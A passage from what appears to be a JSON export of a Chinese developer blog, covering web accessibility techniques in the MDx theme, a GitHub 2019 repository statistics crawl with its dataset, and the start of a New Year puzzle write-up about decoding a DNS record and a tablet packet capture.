表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 